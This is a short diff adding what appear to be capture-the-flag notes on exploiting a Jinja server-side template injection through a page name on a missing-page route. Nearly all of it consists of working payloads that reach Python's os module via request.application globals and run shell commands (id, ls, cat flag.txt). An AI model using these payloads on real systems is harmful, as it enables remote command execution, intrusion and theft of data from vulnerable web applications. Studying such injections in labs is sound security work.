@@ -1,0 +1,10 @@
+using python jinja
+
+
+go to page that doesnt exist, page name is getting uses a jinja parameter
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}_
+
+injecting this got data
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}_
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}_
